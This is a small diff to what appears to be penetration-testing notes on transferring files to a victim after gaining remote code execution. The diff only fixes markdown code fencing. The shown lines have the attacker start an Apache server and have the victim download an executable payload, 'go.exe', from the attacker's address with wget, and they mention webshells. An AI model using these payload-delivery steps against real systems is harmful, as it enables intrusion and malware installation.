@@ -3,7 +3,8 @@ Once we have RCE, we can sometimes want to serve up files or code to download an
 on the victim (e.g., webshell)
 
 #### HTTP
-```sudo service apache2 start
+```
+sudo service apache2 start
 /var/www/html
 wget http://192.168.1.42/go.exe
 ```
